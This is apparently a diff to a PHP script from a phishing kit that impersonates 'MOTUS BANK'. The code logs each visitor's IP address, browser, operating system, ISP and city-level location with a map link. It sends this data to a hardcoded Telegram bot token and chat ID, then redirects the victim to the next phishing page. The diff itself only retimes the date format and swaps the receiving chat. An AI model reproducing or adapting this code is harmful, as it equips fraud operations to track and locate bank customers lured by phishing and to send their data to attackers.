@@ -11,6 +11,9 @@
 $full_date = date("h:i:s,M/d/Y");
 
 
+$full_date = date("h:i:s|M/d/Y");
+$time = date("h:i:s");
+$date = date("M/d/Y");
 
 function get_client_ip()
 {
@@ -169,13 +172,15 @@ if ($success==false) {
 
 $message = "[!] MOTUS BANK    CLICKED [!]\n=====$full_date=====\n============================\nIPaddress        :          $ip\n\n============================\n[!]    USERGENT   INFORMATION    [!]\n============================\n$uaget\n\n============================\n[!]         DEVICE     INFORMATIN       [!]\n============================\nOSystem          :     $uos\nBrowser           :     $bsr\n\n============================\n[!] INTERNET SERVICE PROVIDER [!]\n============================\n$is\n\n============================\n[+]lol THE JAMESBOND TYPE SHIT[+]\n============================\nCity             :     $city\nCountry          :     $country\nContinent          :     $continent\nmaps.google.com/?q=$la$lh$lp";
 
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-821080105',
     'text' => $message
 ];
+
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
+    http_build_query($data));
+
 
 
 header('Location: MOT_1.php');
